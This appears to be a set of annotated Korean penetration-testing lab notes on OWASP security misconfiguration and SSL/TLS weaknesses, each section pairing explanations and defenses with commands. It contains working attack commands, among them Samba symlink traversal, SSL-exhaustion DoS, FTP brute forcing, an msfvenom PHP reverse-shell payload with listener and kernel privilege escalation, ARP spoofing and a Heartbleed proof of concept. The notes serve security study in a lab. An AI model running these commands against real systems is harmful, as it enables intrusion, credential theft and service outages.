## A5 - Security Misconfiguration

### 1. Arbitrary File Access (Samba)

**먼저 포트 스캔을 하는 이유**
```bash
nmap -sC -A -p- 172.16.11.216
```
A3 README에서 정리했던 정찰 단계와 똑같은 이유입니다. **공격하기 전엔 반드시 "이 서버가 뭘 열어놨는지"부터 알아야** 합니다. `-p-`로 전체 포트를 훑는 이유는, Samba(SMB) 서비스가 기본 포트(139, 445)가 아닌 비표준 포트에 떠 있을 수도 있고, 운영자가 "어차피 안 보이겠지"라며 다른 포트에 열어둔 서비스를 놓치지 않기 위해서입니다.

**왜 Metasploit으로 넘어가는가**

스캔으로 "Samba가 떠 있다"는 걸 확인했다면, 다음 질문은 "이 Samba **버전**에 알려진 취약점이 있는가?"입니다. Metasploit은 이미 검증된 공개 취약점(CVE)들을 모듈화해서 가지고 있기 때문에, 직접 익스플로잇 코드를 짤 필요 없이:
```bash
search samba      # 등록된 samba 관련 모듈 목록 조회
use 7             # 검색 결과 번호로 모듈 선택 (검색 결과 순서는 환경마다 다를 수 있음)
show options      # 이 모듈이 요구하는 파라미터(lhost, rhost 등) 확인
set lhost <내IP>
set rhost <타겟IP>
exploit
```
**`show options`를 꼭 확인해야 하는 이유**: Metasploit 모듈마다 필요한 파라미터가 다릅니다(RPORT, SMBSHARE, TARGETURI 등). 이걸 확인 안 하고 바로 `exploit`을 누르면 필수값이 빠져서 실패하거나, 기본값이 내가 원하는 환경과 안 맞아서 엉뚱한 결과가 나올 수 있습니다.

**다른 경로: Symlink Traversal**
```bash
use auxiliary/admin/smb/samba_symlink_traversal
set lhost <내IP>
set rhost <타겟IP>
set smbshare tmp
show options
run
```
**핵심 원리**: 이 모듈은 Samba가 공유 중인 폴더(`tmp`) **안에** 시스템 루트(`/`)를 가리키는 **심볼릭 링크**를 몰래 만들어줍니다. Samba 설정에 `wide links`나 `follow symlinks` 옵션이 안전하게 막혀있지 않으면, 이 심볼릭 링크를 따라 **공유 폴더 밖, 즉 서버 전체 파일시스템**으로 빠져나갈 수 있습니다. "공유 폴더만 보여줘야 하는데, 사실은 전체 디스크가 다 보이게 되는" 구멍입니다.

```bash
smbclient //172.16.11.216/tmp
ls
```
모듈 실행 후 `tmp` 공유에 다시 접속해서 `ls`를 치면, 방금 만들어진 심볼릭 링크 폴더가 보입니다. 그 안으로 들어가면 `/etc/passwd` 같은 시스템 파일까지 그대로 읽을 수 있습니다. `/etc/passwd`는 직접적인 비밀번호는 아니지만(요즘은 해시가 `/etc/shadow`에 있음) **계정 목록, 쉘 종류, UID/GID** 등 다음 공격(계정 추측, 권한상승)에 쓸 정보가 가득 들어있어서 중요한 타겟입니다.

```bash
smbclient -L 172.16.11.216
```
`-L`(List)은 **로그인 없이도 해당 서버에 어떤 공유 폴더들이 떠 있는지 목록만** 보여달라는 옵션입니다. 본격적으로 들어가기 전에 "어떤 공유가 있는지" 가볍게 정찰하는 용도입니다.

**왜 중요한가**: 파일 공유 서비스(Samba/NFS 등)는 "공유 폴더 안쪽만 보여주면 안전하다"는 가정으로 설계되는데, 심볼릭 링크 처리가 잘못되면 그 경계(샌드박스)가 통째로 무너집니다. **방어책**은 `smb.conf`에서 `wide links = no`, `unix extensions = no`, `follow symlinks = no`를 명시적으로 설정하고, 익명/게스트 접근을 막는 것입니다.

### 2. Cross-Origin Resource Sharing (CORS)

```bash
sudo python -m http.server
```
**개념**: CORS는 원래 "다른 출처(origin)의 웹페이지가 내 사이트의 데이터를 함부로 가져가지 못하게" 막는 브라우저 보안 정책입니다. 그런데 서버가 `Access-Control-Allow-Origin: *` 처럼 **모든 출처를 무차별 허용**하거나, `Origin` 헤더 값을 검증 없이 그대로 반사(echo)해주면, 공격자가 만든 악성 페이지에서도 피해자의 인증된 세션으로 데이터를 긁어갈 수 있게 됩니다.

`python -m http.server`는 **공격자가 운영하는 가짜(다른 출처) 웹서버**를 빠르게 띄워서, 그 페이지에서 타겟 서버로 AJAX 요청을 보내보고 "응답이 실제로 넘어오는지"를 테스트하기 위한 용도입니다. (노트에 "이따가 해보기"라고 적어두신 부분은 아직 실습 전이니, 다음에 진행하실 때 ① 타겟의 `Access-Control-Allow-Origin` 응답 헤더 확인 → ② `Access-Control-Allow-Credentials: true`와 함께 와일드카드(`*`)가 쓰였는지 확인 → ③ 실제로 쿠키 포함 요청이 성공하는지 순서로 보시면 됩니다.)

**왜 중요한가**: 와일드카드 CORS + 인증 쿠키 조합은 사실상 "누구나 내 계정으로 API를 호출해도 된다"는 뜻이 됩니다. **방어책**은 허용할 출처를 화이트리스트로 명시하고, `Origin` 헤더를 검증 없이 그대로 반사하지 않는 것입니다.

### 3. Cross-Site Tracing (XST)

```bash
sudo nmap 172.16.11.216 -p 80 --script http-methods
```
**왜 먼저 이걸 하는가**: 서버가 어떤 HTTP 메서드(GET, POST, PUT, **TRACE** 등)를 허용하는지부터 확인해야 합니다. TRACE가 막혀있으면 이 공격 자체가 성립하지 않기 때문입니다.

**TRACE 메서드를 GET에서 바꿔서 보내는 이유**: TRACE 메서드는 원래 "디버깅용"으로, **서버에 도착한 요청을 그대로 다시 돌려주는** 메서드입니다. 즉 내가 보낸 헤더(쿠키 포함)가 응답 본문에 그대로 echo됩니다.

이게 왜 공격이 되냐면, 자바스크립트는 보안상 `document.cookie`로 **HttpOnly 쿠키는 읽을 수 없게** 막혀있습니다. 그런데 XSS로 자바스크립트 실행 권한을 얻은 공격자가 브라우저를 통해 TRACE 요청을 보내게 만들면, 서버가 "지금 보낸 요청 그대로(쿠키 포함)"를 응답으로 돌려주기 때문에, **HttpOnly로 막아놨던 쿠키를 응답 본문을 통해 우회해서 읽어낼 수** 있게 됩니다. (XSS 단독으로는 못 훔치던 쿠키를, XST와 결합하면 훔칠 수 있게 되는 조합 공격입니다.)

**왜 중요한가**: HttpOnly는 "쿠키 도난 방어"의 핵심 수단인데, TRACE가 열려있으면 그 방어가 무력화됩니다. **방어책**은 웹서버에서 TRACE/TRACK 메서드를 비활성화하는 것입니다(Apache는 `TraceEnable off`, IIS는 별도 모듈로 차단).

### 4. DoS (Large Chunk Size)

**개념**: HTTP의 `Transfer-Encoding: chunked` 방식은 데이터를 작은 덩어리(chunk)로 나눠 보내면서, 각 덩어리 앞에 "이 덩어리는 몇 바이트짜리다"라는 크기 값을 적어 보냅니다. 이 크기 값을 비정상적으로 크게(또는 형식을 깨서) 조작하면, 서버가 그 값을 그대로 믿고 **메모리를 과도하게 할당**하거나 **파싱 로직이 무한 대기**에 빠지게 만들 수 있습니다. 한 명의 공격자가 적은 요청만으로도 서버 자원을 고갈시킬 수 있어서 "효율이 좋은" DoS로 분류됩니다.

**왜 중요한가**: 입력값(이 경우 크기 헤더)에 대한 검증이 없으면, 정상적인 프로토콜 필드 하나가 그대로 공격 벡터가 됩니다. **방어책**은 웹서버/리버스 프록시 단에서 청크 크기 상한선을 강제하고, 비정상 형식의 청크는 즉시 연결을 끊는 것입니다.

### 5. DoS (Slow HTTP DoS)

**개념**: 정상적인 HTTP 요청은 헤더 끝에 빈 줄(`\r\n\r\n`, 개행 두 번)을 보내서 "요청이 끝났다"는 걸 서버에 알립니다. Slow HTTP 공격은 **이 마지막 개행을 일부러 보내지 않거나, 한 글자씩 아주 느리게 보내는** 방식입니다. 서버 입장에서는 "요청이 아직 안 끝났으니 계속 기다려야 한다"고 판단해서 해당 연결(스레드/소켓)을 계속 점유한 채로 둡니다. 이런 식으로 **연결을 수백~수천 개 동시에 열어두면**, 서버의 최대 동시 연결 수를 다 채워버려서 정상 사용자는 접속을 못하게 됩니다. (대표적으로 Slowloris 공격이 이 원리입니다.)

**왜 중요한가**: 대용량 트래픽이 필요 없는 "저비용 고효율" DoS라서, 일반적인 트래픽 기반 방어(대역폭 제한)로는 못 막습니다. **방어책**은 웹서버에 요청 헤더/바디 수신 타임아웃을 짧게 설정하고(Apache `mod_reqtimeout`, nginx `client_header_timeout`), 동시 연결 수를 IP당 제한하는 것입니다.

### 6. DoS (SSL-Exhaustion)

```bash
sudo nmap 172.16.11.216 -p 8443 -sS -sV
sudo apt install -y thc-ssl-dos
sudo thc-ssl-dos <아이피> 443 --accept
```
**`nmap -sS -sV`를 먼저 하는 이유**: SSL/TLS 서비스가 정말 그 포트에서 동작 중인지, 어떤 버전인지 확인 후 공격 대상을 명확히 합니다.

**THC-SSL-DOS의 원리**: SSL/TLS 핸드셰이크는 **클라이언트는 거의 연산을 안 해도 되지만, 서버는 비싼 비대칭키 연산(RSA/ECDHE 등)을 매번 수행**해야 하는 구조입니다. 특히 **SSL 재협상(renegotiation)** 기능이 켜져 있으면, 클라이언트가 같은 연결에서 핸드셰이크를 반복 요청할 수 있어서, **공격자는 거의 비용을 안 들이고 서버에는 막대한 CPU 부하**를 줄 수 있습니다. "적은 입력으로 큰 비용을 유발한다"는 점에서 4번(Large Chunk)·5번(Slow HTTP)과 같은 패밀리의 비대칭 DoS입니다.

**`--accept`** 옵션은 도구 자체의 라이선스/경고 동의를 건너뛰기 위한 옵션입니다.

**와이어샤크로 캡쳐하는 이유**: 공격이 실제로 어떻게 동작하는지(짧은 시간에 수많은 Client Hello / 재협상 요청이 발생하는 패턴)를 패킷 레벨에서 눈으로 확인하기 위함입니다. 단순히 "도구를 돌려서 서버가 느려졌다"만 보는 게 아니라, **왜 느려지는지(어떤 패킷이 반복되는지)를 증명**하는 것이 모의해킹 리포트 작성에서 중요합니다.

**왜 중요한가**: HTTPS가 "암호화돼서 안전하다"고 끝나는 게 아니라, **암호화 자체가 연산 비용이라는 새로운 공격 표면을 만든다**는 걸 보여주는 사례입니다. **방어책**은 SSL 재협상을 비활성화하고, 로드밸런서/WAF에서 SSL 핸드셰이크 비율을 제한(rate limiting)하는 것입니다.

### 7. DoS / Brute-force (FTP)

```bash
sudo ftp 172.16.11.216
# bee / bug 로 접속
```
먼저 알려진 기본 계정(`bee`/`bug`)으로 접속이 되는지 수동으로 확인합니다. 이게 가능하다는 것 자체가 **"기본 계정/추측 가능한 계정을 그대로 켜둔" 설정 오류**입니다.

```bash
msf auxiliary(scanner/ftp/ftp_login) > reload
msf auxiliary(scanner/ftp/ftp_login) > set rhost 172.16.11.216
msf auxiliary(scanner/ftp/ftp_login) > set user_file /home/red/user.txt
msf auxiliary(scanner/ftp/ftp_login) > set pass_file /home/red/pass.txt
msf auxiliary(scanner/ftp/ftp_login) > set stop_on_success true
msf auxiliary(scanner/ftp/ftp_login) > show options
msf auxiliary(scanner/ftp/ftp_login) > run
```
> 📝 참고: 이 섹션 제목은 "DoS"지만, 실제로 적어두신 명령어는 **무작위 로그인 시도(브루트포스)** 모듈입니다. 진짜 DoS(예: 동시 연결을 과도하게 생성해서 FTP 데몬을 멈추게 하는 공격)와는 별개의 활동이니, 나중에 다시 보실 때 헷갈리지 않도록 구분해두시면 좋습니다.

- **`reload`**: 모듈을 다시 불러와서 이전에 설정해둔 값이 남아있지 않게 초기화합니다. (이전 실습에서 설정한 옵션이 꼬여서 엉뚱한 타겟을 공격하는 실수를 방지)
- **`user_file` / `pass_file`**: 한 쌍씩 직접 입력하는 대신, 흔히 쓰이는 ID/PW 목록 파일을 넣어서 **자동으로 모든 조합을 시도**하게 합니다.
- **`stop_on_success true`**: 한 번 성공하면 즉시 멈추라는 옵션입니다. 굳이 끝까지 다 시도할 필요 없이, 성공한 계정 하나만 찾으면 충분하기 때문에 시간을 절약합니다.
- **`show options`를 실행 직전에 다시 보는 이유**: 오타 하나(IP 한 글자, 경로 한 글자)로 전체 스캔이 헛수고가 될 수 있어서, **실행 전 마지막 점검**은 항상 습관화하는 게 좋습니다.

**왜 중요한가**: 계정 잠금(lockout) 정책이 없는 서비스는 브루트포스에 무한정 노출됩니다. **방어책**은 로그인 실패 횟수 제한 + 계정 잠금, IP 기반 속도 제한, 가능하면 키 기반 인증(SFTP+키)으로 전환하는 것입니다.

### 8. Insecure SNMP Configuration

```bash
sudo snmpwalk -Os -c public -v localhost system
sudo snmpwalk -Os -c public -v 1 172.16.11.216
sudo snmp-check 172.16.11.216 -c public -p 161 | more
sudo auxiliary/scanner/snmp/snmp_enumusers
```
**왜 로컬에서 먼저 테스트하는가**: `snmpwalk` 명령어 문법이 맞는지, SNMP 클라이언트가 정상 동작하는지를 내 PC(localhost)에 먼저 쏴보고 확인한 뒤, 진짜 타겟에 적용하는 순서입니다. (디버깅 시간을 아끼는 습관)

**`-c public`이 핵심인 이유**: SNMP v1/v2c는 인증 수단이 **"community string"이라는 일종의 공유 비밀번호** 하나뿐인데, `public`(읽기용 기본값)과 `private`(쓰기용 기본값)을 운영자가 바꾸지 않고 그대로 쓰는 경우가 매우 흔합니다. 이 기본값만 알면 **별도 로그인 절차 없이** 시스템 정보를 다 가져올 수 있습니다.

**`-v 1`**: SNMP 버전을 1로 지정. v1은 암호화도 없고 community string도 평문으로 오가서, 네트워크 스니핑으로도 쉽게 탈취됩니다.

**`snmp-check`를 또 쓰는 이유**: `snmpwalk`는 OID(숫자로 된 트리 구조 식별자) 형태의 날 데이터를 그대로 쭈르륵 뽑아주는데, 사람이 읽기에는 불편합니다. `snmp-check`는 그 데이터를 **시스템 정보/네트워크 인터페이스/실행 중인 프로세스/설치된 소프트웨어** 등 카테고리별로 정리해서 보여주는 "보고서 변환기" 역할입니다.

**`snmp_enumusers`**: 같은 SNMP 접근 권한으로도, Windows 타겟이라면 **로컬 사용자 계정 목록**까지 뽑아낼 수 있는 특화 모듈입니다. 계정 이름을 알면 이후 브루트포스(7번 항목)의 효율이 크게 올라갑니다.

**왜 중요한가**: SNMP는 "네트워크 장비/서버를 모니터링하기 위한" 프로토콜인데, 기본 community string을 그대로 두면 **모니터링 권한이 곧 정찰 권한**이 되어버립니다. **방어책**은 community string을 강력한 값으로 변경하거나, 가능하면 SNMP v3(인증+암호화 지원)로 전환하고, SNMP 포트(161/UDP)를 신뢰된 관리망에서만 접근 가능하게 ACL로 제한하는 것입니다.

### 9. WebDAV

**개념**: WebDAV는 HTTP를 확장해서 **원격 서버의 파일을 마치 내 컴퓨터 파일처럼 열람/수정/삭제**할 수 있게 해주는 기술입니다(`PUT`, `DELETE`, `MKCOL` 같은 메서드 추가). 문제는 이 기능이 **인증 없이, 혹은 쓰기 권한까지 열린 채로** 노출되는 경우가 많다는 점입니다.

```bash
# msf 스캐너 모듈로 점검
use 0
set rhosts <타겟IP>
run
```
먼저 스캐너 모듈로 "이 서버가 WebDAV를 지원하고, 쓰기(PUT)가 가능한지"를 확인합니다.

**Burp로 메서드를 PUT으로 바꿔서 파일을 올리는 이유**: 일반 브라우저는 GET/POST만 보내지만, 프록시(Burp)를 쓰면 **임의의 HTTP 메서드**를 직접 만들어 보낼 수 있습니다. `webdav/hack.txt`처럼 새 경로에 PUT 요청을 보내서 **서버에 실제로 파일이 생성되는지** 확인하면, "이 서버는 누구나 파일을 업로드할 수 있다"는 취약점이 증명됩니다. 텍스트 파일(`hack.txt`)로 먼저 테스트하는 이유는, 혹시 실패해도 시스템에 해를 주지 않는 무해한 파일로 먼저 검증하는 안전한 절차이기 때문입니다.

```bash
sudo cadaver http://<주소>/webdav
put <파일>
```
**`cadaver`**: WebDAV 전용 커맨드라인 클라이언트입니다. `ls`, `get`, `put`, `delete` 같은 명령으로 마치 FTP처럼 원격 WebDAV 디렉토리를 다룰 수 있어서, Burp로 한 건씩 테스트하는 것보다 **여러 파일을 다루거나 업로드를 반복 검증할 때 더 편리**합니다.

**왜 중요한가**: PUT이 막혀있지 않은 WebDAV는 결국 "누구나 웹서버 루트(또는 그 하위)에 내가 원하는 파일을 올릴 수 있다"는 뜻이고, 이는 10번 항목처럼 **웹쉘 업로드로 직결**됩니다. **방어책**은 WebDAV가 필요 없으면 모듈 자체를 비활성화하고, 필요하다면 반드시 인증을 강제하고 실행 권한이 있는 디렉토리에는 쓰기를 금지하는 것입니다.

### 10. Local Privilege Escalation (anonymous FTP + WebDAV → reverse shell → kernel exploit)

이 항목은 여러 취약점을 **체인(연결)** 해서 "초기 침투 → 권한 상승"까지 가는 시나리오라서, 단계별로 나눠서 봐야 이해가 쉽습니다.

**① 페이로드(웹쉘) 만들기**
```bash
sudo msfvenom -p php/meterpreter/reverse_tcp lhost=<내IP> lport=<포트> > /home/red/hack.php
```
`msfvenom`은 Metasploit의 **페이로드 생성기**입니다. `php/meterpreter/reverse_tcp`는 "PHP로 실행되며, 실행되는 순간 **공격자(나)에게 먼저 접속을 시도**하는" 방식의 페이로드입니다. 왜 굳이 "내가 타겟에 접속"이 아니라 "타겟이 나에게 접속"하게 만드냐면(리버스 커넥션), **방화벽/NAT가 보통 인바운드(외부→내부)는 막아도 아웃바운드(내부→외부)는 잘 안 막기 때문**입니다. 타겟이 스스로 밖으로 나가는 연결은 방화벽 규칙에 안 걸릴 가능성이 높습니다.

**② 익명 FTP 허용 여부 확인**
```bash
sudo nmap 172.16.11.216 -p 21 --script ftp-anon.nse
```
FTP가 **로그인 없이(anonymous)** 접속을 허용하는지 확인하는 NSE 스크립트입니다. 허용된다면 "Anonymous FTP login allowed"라는 결과가 나옵니다. 이게 중요한 이유는, 익명 FTP에 **쓰기 권한**까지 있다면 인증 없이 서버에 파일을 올릴 수 있는 또 다른 경로가 열리기 때문입니다.

**③ 핸들러(리스너) 준비**
```bash
sudo nc -lvnp 4445
```
또는 Metasploit 안에서:
```bash
search handler type:exploit platform:multi
use ...
set payload php/meterpreter/reverse_tcp
set lhost <내IP>
set rhost <타겟IP>
run
```
**핸들러를 미리 띄워놓는 이유**: ①에서 만든 페이로드가 실행되는 순간 "공격자에게 접속을 시도"하는데, 그 시점에 공격자 쪽에서 **접속을 받아줄 준비(리스너)**가 안 되어 있으면 연결이 실패합니다. 그래서 **웹쉘을 트리거하기 전에 리스너를 반드시 먼저 켜둬야** 합니다.

**④ 웹쉘 업로드 및 실행**
8~9번에서 확인한 **WebDAV의 쓰기 취약점**(또는 익명 FTP의 쓰기 권한)을 이용해 ①에서 만든 `hack.php`를 서버에 업로드한 뒤, 브라우저로 `http://<주소>/webdav/hack.php`에 접속해서 PHP 파일을 **실행**시킵니다. 파일이 실행되는 순간, 안에 내장된 메타스플로잇 페이로드가 ③에서 켜둔 리스너로 접속해오면서 **리버스 쉘(미터프리터 세션)**이 열립니다.

**⑤ 권한 상승 (sendpage)**
```bash
search sendpage
```
이렇게 얻은 쉘은 보통 **웹서버 프로세스 권한(예: www-data)**처럼 제한된 낮은 권한입니다. `sendpage`는 **리눅스 커널 자체의 취약점**(특정 커널 버전에서 `sendpage`라는 시스템 콜 처리 로직의 결함)을 이용해, 일반 사용자 권한에서 **root 권한**으로 올라가는 로컬 권한상승(Local Privilege Escalation) 익스플로잇입니다.

**왜 이 시나리오 전체가 중요한가**: 실제 해킹은 "한 방"이 아니라 **여러 개의 작은 약점(약한 FTP + 열린 WebDAV + 패치 안 된 커널)을 사슬처럼 엮어서** 최종적으로 시스템 전체를 장악하는 경우가 많다는 걸 보여줍니다. 하나하나는 "낮은 위험"으로 평가될 수 있어도, **조합되면 치명적**이 됩니다. **방어책**은 ① 익명 FTP/WebDAV 쓰기 비활성화, ② 업로드 가능한 디렉토리는 실행 권한 제거, ③ 커널/OS를 최신 패치 상태로 유지, ④ 아웃바운드 트래픽도 필요한 포트/대상만 허용하는 방화벽 정책(리버스 쉘 차단)입니다.

### 11. Man-in-the-Middle Attack (HTTP)

```bash
sudo arpspoof -o eth1 -t 172.16.11.213 -r 172.16.11.254
```
**ARP가 뭔지부터**: 같은 네트워크(LAN) 안에서 장비들은 IP 주소만으로 직접 통신하는 게 아니라, "이 IP는 이 MAC 주소가 갖고 있다"는 **ARP 캐시**를 참고해서 통신합니다. ARP는 **인증 절차가 없어서**, 누가 "나는 254번 IP다"라고 거짓 응답을 보내도 장비들은 그냥 믿어버립니다.

**`-t`와 `-r`의 의미**: `arpspoof`를 **양방향**으로 걸어야 진짜 중간자가 됩니다.
- 희생자(213)에게: "라우터(254)는 나(공격자)다"
- 라우터(254)에게: "희생자(213)는 나(공격자)다"

이렇게 양쪽 모두를 속이면, 213과 254가 주고받는 **모든 패킷이 일단 공격자를 거쳐서** 전달됩니다(공격자가 다시 정상적으로 포워딩해주는 한, 양쪽은 통신이 끊긴 걸 못 느낍니다). 노트에 적힌 "우체부가 편지를 몰래 뜯어보는" 비유가 정확합니다.

**왜 "HTTP" MITM이 특히 위험한가**: HTTP는 **암호화가 없는 평문** 프로토콜이라서, 중간에서 가로챈 패킷을 와이어샤크 같은 도구로 열어보면 **로그인 폼에 입력한 ID/PW, 세션 쿠키**가 그대로 글자로 보입니다. (HTTPS였다면 암호화되어 있어서 이 단계만으론 못 읽고, A6에서 다루는 SSL 공격이 추가로 필요합니다.)

**왜 중요한가**: ARP는 설계 자체에 인증이 없어서, **같은 네트워크에 발만 들여놓으면** 누구나 시도할 수 있는 공격입니다(카페 와이파이, 회사 내부망 등). **방어책**은 ① 가능하면 HTTP 대신 HTTPS 강제, ② 스위치에서 Dynamic ARP Inspection / 포트 보안 활성화, ③ 정적 ARP 엔트리 또는 ARP 변조 감지 도구(arpwatch) 사용입니다.

### 12. Old, Backup & Unreferenced Files

**개념**: 개발자가 배포 전 임시로 만들었거나(`backup.zip`, `index.php.bak`, `~old`), 테스트용으로 올려뒀다가 지우는 걸 잊은 파일들이 웹 루트에 그대로 남아있는 경우입니다. 이런 파일은 **사이트 메뉴/링크에는 연결돼 있지 않지만(unreferenced)**, URL을 직접 추측하거나 디렉토리 목록을 통해 접근하면 그대로 열립니다.

**왜 Exploit-DB에서 "backup"을 찾아보는가**: 특정 CMS/프레임워크는 설치 과정에서 **관습적으로 같은 이름의 백업/설치 파일**(예: `setup-config.php.bak`, `wp-config.php~`)을 남기는 경우가 알려져 있습니다. Exploit-DB 같은 공개 취약점 DB를 검색하면, "이 소프트웨어를 쓰면 이 경로에 흔히 이런 파일이 남는다"는 **이미 알려진 패턴**을 빠르게 참고할 수 있습니다. 직접 모든 경로를 무작위로 추측하는 것보다 훨씬 효율적입니다.

**왜 중요한가**: 백업 파일은 종종 **소스 코드 원문**(주석에 적힌 DB 비밀번호, 내부 API 키 등)을 담고 있어서, 실행되는 페이지에서는 안 보이던 정보가 **".bak"이나 "~" 하나 붙은 파일**에서는 평문으로 그대로 드러납니다. **방어책**은 배포 자동화(CI/CD)로 불필요한 파일이 웹 루트에 절대 안 들어가게 하고, 디렉토리 리스팅을 비활성화하며, 정기적으로 웹 루트를 스캔해 의심 파일을 제거하는 것입니다.

## A6 - Sensitive Data Exposure (SSL/TLS)

### 1. Base64 Encoding

**왜 별도 항목으로 다루는가**: 실무에서 가장 흔한 오해 중 하나가 "Base64로 인코딩했으니 안전하다"는 생각입니다. Base64는 **암호화가 아니라 그냥 표현 방식 변환**입니다(이진 데이터를 텍스트로 바꾸는 것뿐). 디코딩 함수 한 번이면 누구나 원문을 복원할 수 있습니다. SSL/TLS 점검을 시작하기 전에 이 개념을 먼저 짚어두는 건, **"인코딩 ≠ 암호화"**라는 걸 명확히 하기 위한 기초 다지기로 보시면 됩니다.

### 2. BEAST / CRIME / BREACH (SSL/TLS 진단 도구 모음)

```bash
git clone https://github.com/OWASP/O-Saft   # (또는 tgz 다운로드)
tar xzf o-saft.tgz
sudo ./o-saft.pl +check -v 172.16.11.216:9443 > o-saftcheck.txt
```
**`+check -v`의 의미**: `+check`는 O-Saft에게 "이 서버의 SSL/TLS 설정 전반(지원 프로토콜 버전, 암호 스위트, 인증서 상태, 알려진 취약점 시그니처)을 다 점검해라"는 명령이고, `-v`(verbose)는 점검 과정을 상세히 보여달라는 옵션입니다.

**결과를 파일로 저장하는 이유(`> o-saftcheck.txt`)**: 점검 항목이 워낙 많아서 화면에 다 띄우면 스크롤로 놓치기 쉽습니다. 파일로 저장해두면 나중에 `grep`으로 특정 키워드(예: "VULNERABLE", "SSLv3")만 뽑아보거나, 리포트에 그대로 첨부할 수 있습니다.

**왜 9443처럼 비표준 포트도 신경 써야 하는가**: 보통 HTTPS는 443번을 쓰지만, 관리자가 일반 웹서비스와 분리하려고 다른 포트(8443, 9443 등)에 HTTPS를 띄워두는 경우가 흔합니다. **"포트 번호가 특이하다고 안전한 게 아니다"** — 결국 nmap 전체 포트 스캔(A5-1)이 여기서도 똑같이 중요한 이유입니다.

다른 도구들(`sslscan`, `sslyze`, `testssl.sh`)도 같이 쓰는 이유는, **하나의 도구가 모든 취약점을 다 잡아주지 않기 때문**입니다. 도구마다 검사 항목, 최신 CVE 반영 속도, 출력 포맷이 다르므로 **교차 검증**용으로 여러 개를 돌려보는 게 정확도를 높입니다.

이제 이 점검이 실제로 무엇을 잡아내는지, 3가지 공격을 정리합니다.

**① BEAST (Browser Exploit Against SSL/TLS)**
- **공격 대상**: TLS 1.0 이하에서 쓰이는 **CBC(Cipher Block Chaining)** 모드
- **원리**: CBC는 블록을 암호화할 때 이전 블록의 결과를 다음 블록에 섞어 쓰는데, 이때 들어가는 **초기화 벡터(IV)를 공격자가 예측 가능**했던 게 문제였습니다. 공격자가 악성 스크립트로 피해자 브라우저에서 추측한 평문을 반복적으로 보내며 암호문과 비교하면, 진짜 비밀(쿠키 등)을 한 글자씩 알아낼 수 있습니다.
- **왜 중요한가**: "암호화되어 있다"는 사실만으로는 안전을 보장하지 못하며, **암호화 모드(CBC vs GCM)의 설계 결함**이 직접적인 공격 표면이 된다는 것을 보여줍니다.
- **방어**: TLS 1.1 이상 사용, CBC 대신 AEAD 계열(GCM 등) 암호 스위트 사용.

**② CRIME (Compression Ratio Info-leak Made Easy)**
- **공격 대상**: TLS 레벨의 **데이터 압축(DEFLATE)** 기능
- **원리**: "중복되는 글자가 많을수록 압축 후 크기가 줄어든다"는 압축의 기본 성질을 악용합니다. 공격자가 추측값을 진짜 쿠키 옆에 끼워 보내고, **압축된 패킷의 크기 변화**만 관찰해서 한 글자씩 쿠키를 맞혀나갑니다. 내용을 직접 못 봐도 "크기가 줄었다/안 줄었다"는 정보만으로 비밀을 복원할 수 있다는 게 핵심입니다.
- **방어**: TLS 압축 기능 비활성화.

**③ BREACH**
- **공격 대상**: CRIME이 TLS 압축을 막은 후 등장한 변형으로, 이번엔 **HTTP 레벨 압축(gzip/deflate)**을 타겟으로 같은 원리를 적용합니다.
- **원리**: CSRF 토큰처럼 응답 본문에 들어있는 비밀 값에 대해, 요청 파라미터를 한 글자씩 바꿔 보내며 **응답 압축 크기 변화**를 관찰해 토큰을 복원합니다.
- **방어**: 민감 정보가 포함된 응답은 압축하지 않거나, 토큰 값을 매 요청마다 무작위로 바꿔서(masking) 압축으로 패턴을 찾을 수 없게 만듭니다.

**세 공격의 공통점**: 모두 "**관찰 가능한 부수 정보(IV 패턴, 압축 크기)**로 직접 복호화하지 않고도 비밀을 추론한다"는 **사이드 채널(side-channel) 공격**입니다. 그래서 일반적인 "암호가 뚫렸다"는 느낌보다는, **암호화 주변의 부가 기능(압축, 모드 선택)이 새로운 구멍을 만든다**는 교훈을 줍니다.

### 3. Heartbleed

```bash
sudo nmap --script ssl-heartbleed -sV -p 443 172.16.11.216
sudo python2 heartbleed.py -p 172.16.11.216
```
**개념(CVE-2014-0160)**: OpenSSL의 **Heartbeat 확장**은 "연결이 살아있는지 확인"하는 기능으로, 클라이언트가 데이터를 보내면 서버가 **같은 길이만큼** 그대로 돌려주는 방식입니다. 그런데 OpenSSL의 특정 버전은 **클라이언트가 보낸 "길이" 값을 검증 없이 그대로 신뢰**하는 버그가 있었습니다. 즉 "나는 1바이트를 보낼 건데, 64KB만큼 돌려줘"라고 거짓으로 요청하면, 서버는 자기 메모리에서 64KB를 긁어서 그대로 돌려줍니다.

**왜 치명적인가**: 이 메모리 안에는 **TLS 개인키, 다른 사용자의 세션 데이터, 평문 비밀번호** 등 우연히 그 메모리 영역에 남아있던 모든 것이 들어있을 수 있습니다. 인증/권한 같은 절차가 전혀 필요 없이, **그냥 패킷 하나로 서버 메모리를 엿볼 수 있다**는 점에서 2014년 당시 인터넷 전체를 떠들썩하게 한 취약점이었습니다.

**nmap 스크립트 vs Python 스크립트를 같이 쓰는 이유**: nmap의 `ssl-heartbleed`는 "취약한지 여부"만 빠르게 **진단**해주고, `heartbleed.py` 같은 PoC 스크립트는 실제로 **메모리 일부를 추출**해서 어떤 데이터가 새어나오는지 직접 보여줍니다. 진단(있다/없다)과 증명(실제로 뭐가 새는지)을 단계적으로 나눠서 접근하는 것입니다.

**방어**: 취약한 OpenSSL 버전을 즉시 패치하고(이게 근본 해결책), 만약 패치 전에 노출됐었다면 **TLS 인증서/개인키를 재발급**해야 합니다(키 자체가 유출됐을 수 있으므로 패치만으로는 부족).

### 4. POODLE

```bash
sudo nmap --script ssl-poodle -sV -p 443 172.16.11.216
```
**개념(Padding Oracle On Downgraded Legacy Encryption)**: 두 단계로 이루어진 공격입니다.

**① 다운그레이드 공격**: 공격자가 네트워크 상에서 TLS 핸드셰이크를 방해해서, 클라이언트와 서버가 "최신 TLS로는 연결이 안 되네, 그럼 옛날 **SSLv3**로 통신하자"라고 **강제로 낮은 버전으로 떨어지게** 만듭니다. (서버가 호환성을 위해 SSLv3를 여전히 지원하고 있을 때만 가능)

**② 패딩 오라클 공격**: SSLv3의 CBC 패딩 처리 방식에는 결함이 있어서, 공격자가 암호문의 특정 바이트를 조작해 보내고 **서버가 "패딩 오류" 응답을 주는지 안 주는지**(오라클 = 정답을 알려주는 존재)만 관찰하면, 평문을 한 바이트씩 복원할 수 있습니다. BEAST와 마찬가지로 CBC 모드를 노리지만, **IV 예측이 아니라 패딩 검증 로직의 부작용**을 이용한다는 점이 다릅니다.

